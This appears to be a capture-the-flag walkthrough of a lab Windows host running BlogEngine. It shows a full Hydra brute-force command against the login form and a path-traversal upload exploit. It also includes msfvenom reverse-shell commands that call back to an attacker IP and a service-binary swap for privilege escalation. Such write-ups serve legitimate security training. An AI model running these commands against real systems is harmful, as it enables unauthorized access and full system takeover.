## Introduction

Name of the clown

Do a reverse image search

![image](https://user-images.githubusercontent.com/16500435/97789904-84c56100-1bc4-11eb-9b3c-10e64e32f4d3.png)


## Using Hydra to brute-force a login
We need to find a login page to attack and identify what type of request the form is making to the webserver.

![image](https://user-images.githubusercontent.com/16500435/97790028-86435900-1bc5-11eb-86af-33f4f11ac77e.png)

![image](https://user-images.githubusercontent.com/16500435/97790030-9a875600-1bc5-11eb-8bd5-1aca2c490575.png)

### What request type is the Windows website login form using?
Inspect the webpage

![image](https://user-images.githubusercontent.com/16500435/97790071-eafeb380-1bc5-11eb-9c94-fa5a33b7a47a.png)

To  use hydra to attack the login page

we need to know 3 things
1. The first is the page on the server to GET or POST to
2. POST/GET variables (this can be obtained by interceptng with burpsuite or inspect with the browser
3. the string that it checks for an invalid or valid login

the 3 things are separated by :

for this webpage;

```diff
- 1 = /Account/login.aspx
```

![image](https://user-images.githubusercontent.com/16500435/97790220-12a24b80-1bc7-11eb-9971-f21e015e060a.png)

```diff
- 2 =
```
__VIEWSTATE=NPcS%2FpPhbdpYWPlz3e74oFCXMstMbFqsP9cOiB4V8tH6xy7L82cQCWH3qQgCTeCoC8%2BUmqGDy7R%2Ffshw3WGlKVk%2BNFV2lMJiJO68c31GLNzcyHnqHFXU8jKKIdbnUPhyqURshgyGe8FNU2wgrI%2FeouiiPG4nL3e4pII5dfRTwvkHiHO3iWrgMhaQKLUsL5kQyfLku5kbk%2F21SAMguE9fI8wO%2FY4koYBwIBFH9m%2FxbkIYOsK26%2B3faUvN7vyzNNV%2BIyACpa8CgVI%2FxHVy4hW%2FtjPBdlc5QWrh69LR4SEVuFSby94rPwlA86Vk66Ui02Ug7qd62oHcebVjWyiYXOxRK0o7c0DN2On1ACrMXtAlF7dr6jj7&__EVENTVALIDATION=FlYxJzeHWCNQkM9qo57%2Fk6MbCgdLruRe41cZxlMooYGMNdS3onCsDAcKAha3%2FNCVMRzf%2BZl9z4sZBQrPURw8Xg%2BKOIr7H601FFotgpUO6wCpgj4%2F6SbRZgtC5kLZqsLKApwKszpNxHDx1N8dXHe4jAbDP4kLIn%2BpiXKKDI9Az1RN2n3e&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=login123&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in

![image](https://user-images.githubusercontent.com/16500435/97790313-df13f100-1bc7-11eb-930a-839bdcaa5aae.png)

```diff
- 3 =
```
Login failed

![image](https://user-images.githubusercontent.com/16500435/97790334-0ff42600-1bc8-11eb-88d3-300de801586e.png)

full command to brute-force with hydra is;

_$hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.86.160 http-post-form "/Account/login.aspx:__VIEWSTATE=NPcS%2FpPhbdpYWPlz3e74oFCXMstMbFqsP9cOiB4V8tH6xy7L82cQCWH3qQgCTeCoC8%2BUmqGDy7R%2Ffshw3WGlKVk%2BNFV2lMJiJO68c31GLNzcyHnqHFXU8jKKIdbnUPhyqURshgyGe8FNU2wgrI%2FeouiiPG4nL3e4pII5dfRTwvkHiHO3iWrgMhaQKLUsL5kQyfLku5kbk%2F21SAMguE9fI8wO%2FY4koYBwIBFH9m%2FxbkIYOsK26%2B3faUvN7vyzNNV%2BIyACpa8CgVI%2FxHVy4hW%2FtjPBdlc5QWrh69LR4SEVuFSby94rPwlA86Vk66Ui02Ug7qd62oHcebVjWyiYXOxRK0o7c0DN2On1ACrMXtAlF7dr6jj7&__EVENTVALIDATION=FlYxJzeHWCNQkM9qo57%2Fk6MbCgdLruRe41cZxlMooYGMNdS3onCsDAcKAha3%2FNCVMRzf%2BZl9z4sZBQrPURw8Xg%2BKOIr7H601FFotgpUO6wCpgj4%2F6SbRZgtC5kLZqsLKApwKszpNxHDx1N8dXHe4jAbDP4kLIn%2BpiXKKDI9Az1RN2n3e&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"_


username = "admin" from the post(hint)

password is a wordlist

Output from the hydra bruteforce

![1](https://user-images.githubusercontent.com/16500435/97790537-a117cc80-1bc9-11eb-8613-922a6190526d.jpg)


**Compromising the machine**

![2](https://user-images.githubusercontent.com/16500435/97790577-f18f2a00-1bc9-11eb-9278-2330ffdb567f.jpg)

we can see the version of the blogengine running after logon
then search exploitdb or use searchsploit to find vulnerabilities/exploit for this version

**Searchsploit**
![3](https://user-images.githubusercontent.com/16500435/97790646-78dc9d80-1bca-11eb-98fe-88c4ad818483.jpg)

**Exploitdb**
![4](https://user-images.githubusercontent.com/16500435/97790659-a6294b80-1bca-11eb-8010-164de3bb1159.jpg)

Read through the instruction on exploitdb
Download the exploit
Change the attacker ip address and port on the code to your ip/port

![5](https://user-images.githubusercontent.com/16500435/97790680-e2f54280-1bca-11eb-8436-b56292a992db.jpg)

save as PostView.ascx
Upload this file to the machine (this url will provide means to upload file to the machine http://10.10.221.182/admin/app/editor/editpost.cshtml)

![6](https://user-images.githubusercontent.com/16500435/97790700-13d57780-1bcb-11eb-8544-69f9006fa247.jpg)

the vulnerability is triggered by accessing the base URL for the blog with a theme override specified like so:
 
http://10.10.221.182/?theme=../../App_Data/files

start a netcat session to listen on the port you specify in the exploit then access the above url

![7](https://user-images.githubusercontent.com/16500435/97790724-497a6080-1bcb-11eb-839e-88413a0bb36c.jpg)

This shell is unstable to get a more stable shell We will create a reverse shell executable with msfvenom:

on your machine run the command;

_msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=<attacker_machine_ip> LPORT=<port_to_listen> -f exe -o <shell_name.exe>_

Example: _msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=10.8.69.211 LPORT=4444 -f exe -o myshell.exe_

Now upload this file to the window machine using powershell

start a simple HTTPserver to serve

![a](https://user-images.githubusercontent.com/16500435/97790751-92321980-1bcb-11eb-8bb3-f8ae5e75685a.jpg)

on the window machine

![b](https://user-images.githubusercontent.com/16500435/97790813-31efa780-1bcc-11eb-9c7f-02ea9eec0cdd.jpg)

Once the upload is successful, execute the file
first start an nc session to listen on the port specified on the shell you created.

![c](https://user-images.githubusercontent.com/16500435/97790856-ac202c00-1bcc-11eb-8631-f921856ade1d.jpg)
![d](https://user-images.githubusercontent.com/16500435/97790866-c528dd00-1bcc-11eb-8dce-ea560739a548.jpg)

To Execute the file ;
_start myshell.exe_

![e](https://user-images.githubusercontent.com/16500435/97790877-e8538c80-1bcc-11eb-90ae-e8ce4bd1bd0e.jpg)

Successfully connected

```diff
@@*Alternative Method*@@
```
Use Metersploit
Upload the shell and execute the shell on the window machine, then exploit on metasploit

![f](https://user-images.githubusercontent.com/16500435/97790967-e4743a00-1bcd-11eb-8d4b-23860c806602.jpg)

![g](https://user-images.githubusercontent.com/16500435/97790974-f950cd80-1bcd-11eb-890e-45daab2f991c.jpg)

## PRIVILEGE ESCALATION

![aa](https://user-images.githubusercontent.com/16500435/97791015-3f0d9600-1bce-11eb-967a-890a84176788.png)

![bb](https://user-images.githubusercontent.com/16500435/97791042-809e4100-1bce-11eb-883d-bbeee85cfa57.png)

**ALternative Method to Escalate Privilege**

Going through the winPEAS output on the services tab, we can see interesting service (WindowsScheduler) which can be modified.
its located in C:\Program Files (x86)\SystemScheduler

![h](https://user-images.githubusercontent.com/16500435/97791095-f30f2100-1bce-11eb-8351-184adbc20e23.jpg)

navigate to this directory and see what is in it

![i](https://user-images.githubusercontent.com/16500435/97791110-1afe8480-1bcf-11eb-8bc9-2e0de59670bd.jpg)

we also can check tasks that are running using the command _tasklist /v_

![cc](https://user-images.githubusercontent.com/16500435/97791141-631da700-1bcf-11eb-8aca-61713da1ea00.png)

We can use **venom** to create a window reverse-shell and replace the task with it

_msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.69.211 LPORT=4444 -f exe -o shell.exe_

![j](https://user-images.githubusercontent.com/16500435/97791186-cc051f00-1bcf-11eb-80e4-0701710112cc.jpg)

![dd](https://user-images.githubusercontent.com/16500435/97791206-23a38a80-1bd0-11eb-9ace-9b85a601be4f.png)

![image](https://user-images.githubusercontent.com/16500435/97791225-59e10a00-1bd0-11eb-86fb-a406f9260064.png)


